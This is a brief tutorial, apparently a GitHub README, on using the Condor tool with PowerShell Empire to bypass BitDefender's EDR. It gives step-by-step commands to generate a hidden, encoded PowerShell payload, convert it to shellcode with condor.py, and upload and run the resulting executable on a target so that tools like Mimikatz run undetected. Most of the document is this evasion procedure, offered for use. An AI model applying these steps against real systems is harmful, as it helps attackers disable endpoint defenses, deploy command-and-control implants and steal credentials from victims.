
## Using Condor + Powershell Empire

The [condor](https://github.com/MrEmpy/Condor) tool is also able to bypass BitDefender's EDR, including running Powershell Empire's own tools without any interruption, such as Mimikatz.




<B>1. Open your Powershell Empire and generate a Powershell payload, example: </B>

      powershell -Sta -Nop -Window Hidden -EncodedCommand cwB2ACAAbwAgACg...

   2. Run the condor tool with the following command:

     python3 condor.py -p windows/x64/exec       

  3. Paste the Powershell payload to generate the shellcode

![image](https://github.com/HackWithSumit/Bitdefender-Endpoint-Security-Bypass/assets/120317751/6b7f8d4d-186d-433d-bf35-6cf225be936e)


  4. Upload the EXE to the machine and run.

![image](https://github.com/HackWithSumit/Bitdefender-Endpoint-Security-Bypass/assets/120317751/a5a2339a-a4c2-47af-957e-0a0949356751)





